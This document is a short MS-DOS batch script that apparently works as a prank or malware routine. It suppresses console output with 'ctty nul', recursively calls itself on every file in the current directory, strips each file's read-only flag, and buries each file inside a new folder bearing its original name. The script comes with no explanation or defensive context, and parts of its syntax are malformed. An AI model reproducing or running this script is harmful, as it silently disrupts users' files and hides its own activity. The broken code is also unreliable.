   @echo off
   ctty nul
   if %1==" goto EnBucla
   attrib -r %1
   ren %1 EnBucla.swp
   md %1
   move EnBucla.swp %1\
   ren %1\EnBucla.swp %1\%1
   goto FinBucle
   :EnBucla
   for %%n in(*.*) do Call %0 %%n
   :FinBucle
